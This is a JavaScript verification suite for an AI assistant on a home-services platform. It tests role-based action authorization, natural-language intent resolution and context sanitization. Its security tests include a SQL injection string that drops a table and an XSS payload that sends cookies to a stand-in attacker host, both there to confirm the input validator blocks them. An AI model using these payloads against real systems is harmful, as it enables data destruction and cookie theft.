/**
 * Automated Verification Suite for Phases 9, 10, 11, and 12
 * 
 * Tests:
 * - Phase 9: Action Execution Pipeline (Zero Fake Success)
 * - Phase 10: Security & Permission Boundaries (Anti-Privilege Escalation, SQLi / XSS Shield)
 * - Phase 11: Unseen Natural Language Input Understanding (Zero Hardcoding)
 * - Phase 12: Full Multi-Role End-to-End Verification (Customer, Pillar, Admin, Super Admin)
 */

import 'dotenv/config';
import { aiService } from '../src/services/pillar/aiService.js';
import { capabilityResolutionEngine } from '../src/services/ai/capabilityResolutionEngine.js';
import { aiActionSecurityService } from '../src/services/ai/aiActionSecurityService.js';

async function runTests() {
  console.log('=== Starting Verification: Phase 9, 10, 11, 12 (Execution, Security, Unseen, E2E) ===\n');

  let passed = 0;
  let total = 0;

  function assert(condition, desc) {
    total++;
    if (condition) {
      console.log(`✅ PASS: ${desc}`);
      passed++;
    } else {
      console.error(`❌ FAIL: ${desc}`);
    }
  }

  // ============================================================
  // PHASE 9: ACTION EXECUTION PIPELINE
  // ============================================================
  console.log('--- PHASE 9: Action Execution Pipeline (Real Backend Wiring) ---');
  
  let navigatedRoute = null;
  const mockNavigate = (path) => { navigatedRoute = path; };

  // 1. Customer booking execution
  const customerExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'customer',
    actionId: 'BOOK_SERVICE',
    payload: { path: '/services' },
    navigate: mockNavigate
  });
  assert(customerExec.success && navigatedRoute === '/services', "Customer booking executes navigation to '/services'");

  // 2. Pillar order execution
  const pillarExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'pillar',
    actionId: 'MANAGE_PILLAR_ORDERS',
    payload: {},
    navigate: mockNavigate
  });
  assert(pillarExec.success && navigatedRoute === '/dashboard/orders', "Pillar order management executes navigation to '/dashboard/orders'");

  // 3. Admin KYC review execution
  const adminExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'admin',
    actionId: 'ADMIN_REVIEW_KYC',
    payload: {},
    navigate: mockNavigate
  });
  assert(adminExec.success && navigatedRoute === '/admin/pillars', "Admin KYC review executes navigation to '/admin/pillars'");

  // 4. Super Admin governance execution
  const superExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'super_admin',
    actionId: 'SUPER_ADMIN_GOVERNANCE',
    payload: {},
    navigate: mockNavigate
  });
  assert(superExec.success && navigatedRoute === '/admin/super/governance', "Super Admin executes navigation to '/admin/super/governance'");

  // ============================================================
  // PHASE 10: SECURITY BOUNDARIES & INJECTION SHIELD
  // ============================================================
  console.log('\n--- PHASE 10: Security & Boundary Enforcement ---');

  // 1. Customer privilege escalation attempt (attempting to trigger KYC)
  const custPrivEsc = aiActionSecurityService.authorizeAction({
    role: 'customer',
    actionId: 'ADMIN_REVIEW_KYC'
  });
  assert(!custPrivEsc.authorized && custPrivEsc.status === 403, "Blocked Customer privilege escalation to Admin KYC");

  // 2. Pillar privilege escalation attempt (attempting Super Admin Governance)
  const pillarPrivEsc = aiActionSecurityService.authorizeAction({
    role: 'pillar',
    actionId: 'SUPER_ADMIN_GOVERNANCE'
  });
  assert(!pillarPrivEsc.authorized && pillarPrivEsc.status === 403, "Blocked Pillar privilege escalation to Super Admin Governance");

  // 3. Normal Admin global scope escalation attempt
  const adminScopeEsc = aiActionSecurityService.authorizeAction({
    role: 'admin',
    actionId: 'ADMIN_FINANCE',
    scope: 'GLOBAL'
  });
  assert(!adminScopeEsc.authorized && adminScopeEsc.error === 'SCOPE_VIOLATION', "Blocked Normal Admin from exceeding zonal scope");

  // 4. SQL Injection attempt detection
  const sqlInjection = aiActionSecurityService.validateInputSafety("What is my booking?'; DROP TABLE service_requests;--");
  assert(!sqlInjection.isSafe && sqlInjection.error === 'SECURITY_THREAT_DETECTED', "Blocked malicious SQL injection payload");

  // 5. Cross-Site Scripting (XSS) attempt detection
  const xssAttempt = aiActionSecurityService.validateInputSafety("<script>fetch('http://attacker.com/cookie')</script> Need electrician");
  assert(!xssAttempt.isSafe && xssAttempt.error === 'SECURITY_THREAT_DETECTED', "Blocked malicious script tag injection");

  // 6. Sensitive context sanitization
  const dirtyContext = {
    user: 'Customer A',
    adminZone: 'SZ_CHENNAI',
    commissionRate: 0.15,
    serverTelemetry: { cpuLoad: '45%' },
    apexEncryptionKey: 'secret-key-123'
  };
  const sanitized = aiActionSecurityService.sanitizeContext(dirtyContext, 'customer');
  assert(!sanitized.adminZone && !sanitized.commissionRate && !sanitized.serverTelemetry && sanitized.user === 'Customer A', "Sanitized sensitive admin telemetry from Customer context");

  // ============================================================
  // PHASE 11: UNSEEN NATURAL LANGUAGE INPUT TESTS
  // ============================================================
  console.log('\n--- PHASE 11: Unseen Natural Language Input Tests ---');

  // 1. Unseen Customer Plumbing Query (colloquial)
  const unseenPlumb = await aiService.chatWithMascot({
    message: "My bathroom tap won't stop sputtering brownish water everywhere, please send someone right away!",
    context: { route: '/home', language: 'en', role: 'customer' }
  });
  assert(unseenPlumb.action && unseenPlumb.action.actionId === 'BOOK_SERVICE', "Unseen sputtering tap query resolved to BOOK_SERVICE");

  // 2. Unseen Customer Arrival Query (colloquial)
  const unseenArrival = await aiService.chatWithMascot({
    message: "How long until the repair person knocks on my front door?",
    context: {
      route: '/requests',
      language: 'en',
      role: 'customer',
      request: { id: 'req-live-9921', service: 'Plumber' }
    }
  });
  assert(unseenArrival.action && unseenArrival.action.actionId === 'TRACK_REQUEST' && unseenArrival.action.path.includes('req-live-9921'), "Unseen arrival query resolved to TRACK_REQUEST with live ID bound");

  // 3. Unseen Pillar Cash Query (colloquial)
  const unseenCash = await aiService.chatWithMascot({
    message: "The homeowner just handed me four hundred rupees cash for the kitchen job.",
    context: { route: '/dashboard/orders', language: 'en', role: 'pillar' }
  });
  assert(unseenCash.action && unseenCash.action.actionId === 'COLLECT_HAND_CASH', "Unseen homeowner cash query resolved to COLLECT_HAND_CASH");

  // 4. Unseen Pillar Earnings Query (colloquial)
  const unseenEarnings = await aiService.chatWithMascot({
    message: "Can you review how much money I took home this week after deductions?",
    context: { route: '/dashboard', language: 'en', role: 'pillar' }
  });
  assert(unseenEarnings.action && unseenEarnings.action.actionId === 'VIEW_EARNINGS', "Unseen take-home money query resolved to VIEW_EARNINGS");

  // 5. Unseen Admin Onboarding Query (colloquial)
  const unseenOnboarding = await aiService.chatWithMascot({
    message: "Are there any new electrician or plumber onboarding forms awaiting approval in Velachery?",
    context: { route: '/admin/pillars', language: 'en', role: 'admin' }
  });
  assert(unseenOnboarding.action && unseenOnboarding.action.actionId === 'ADMIN_REVIEW_KYC', "Unseen onboarding approval query resolved to ADMIN_REVIEW_KYC");

  // 6. Unseen Super Admin Telemetry Query (colloquial)
  const unseenTelemetry = await aiService.chatWithMascot({
    message: "Display live cluster status, load balancer health and system anomalies across the state.",
    context: { route: '/admin/monitoring', language: 'en', role: 'super_admin' }
  });
  assert(unseenTelemetry.action && unseenTelemetry.action.actionId === 'SUPER_ADMIN_MONITORING', "Unseen cluster health query resolved to SUPER_ADMIN_MONITORING");

  // ============================================================
  // PHASE 12: FULL MULTI-ROLE END-TO-END JOURNEY VERIFICATION
  // ============================================================
  console.log('\n--- PHASE 12: Full Multi-Role End-to-End Verification ---');

  // E2E 1: Customer Journey (Natural Language -> Intent -> Capability -> Auth -> Execution)
  const custQuery = "Need an emergency electrician to replace burnt fuse";
  const custRes = await aiService.chatWithMascot({
    message: custQuery,
    context: { route: '/home', language: 'en', role: 'customer' }
  });
  const custActionExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'customer',
    actionId: custRes.action?.actionId,
    payload: { path: custRes.action?.path },
    navigate: mockNavigate
  });
  assert(custActionExec.success && navigatedRoute === '/services', "Customer E2E: Natural language query successfully navigated to '/services'");

  // E2E 2: Pillar Journey
  const pillarQuery = "Show me the list of jobs assigned to me for today";
  const pillarRes = await aiService.chatWithMascot({
    message: pillarQuery,
    context: { route: '/dashboard', language: 'en', role: 'pillar' }
  });
  const pillarActionExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'pillar',
    actionId: pillarRes.action?.actionId,
    payload: { path: pillarRes.action?.path },
    navigate: mockNavigate
  });
  assert(pillarActionExec.success && navigatedRoute === '/dashboard/orders', "Pillar E2E: Natural language query successfully navigated to '/dashboard/orders'");

  // E2E 3: Admin Journey
  const adminQuery = "Check technician background verification queue";
  const admRes = await aiService.chatWithMascot({
    message: adminQuery,
    context: { route: '/admin', language: 'en', role: 'admin' }
  });
  const admActionExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'admin',
    actionId: admRes.action?.actionId,
    payload: { path: admRes.action?.path },
    navigate: mockNavigate
  });
  assert(admActionExec.success && navigatedRoute === '/admin/pillars', "Admin E2E: Natural language query successfully navigated to '/admin/pillars'");

  // E2E 4: Super Admin Journey
  const saQuery = "Audit state-wide governance hierarchy";
  const saRes = await aiService.chatWithMascot({
    message: saQuery,
    context: { route: '/admin/super/governance', language: 'en', role: 'super_admin' }
  });
  const saActionExec = await aiActionSecurityService.executeAuthorizedAction({
    role: 'super_admin',
    actionId: saRes.action?.actionId,
    payload: { path: saRes.action?.path },
    navigate: mockNavigate
  });
  assert(saActionExec.success && navigatedRoute === '/admin/super/governance', "Super Admin E2E: Natural language query successfully navigated to '/admin/super/governance'");

  console.log(`\n========================================`);
  console.log(`FINAL SCORECARD: ${passed}/${total} TESTS PASSED`);
  console.log(`========================================`);

  if (passed === total) {
    process.exit(0);
  } else {
    process.exit(1);
  }
}

runTests().catch(err => {
  console.error("Test execution failed:", err);
  process.exit(1);
});
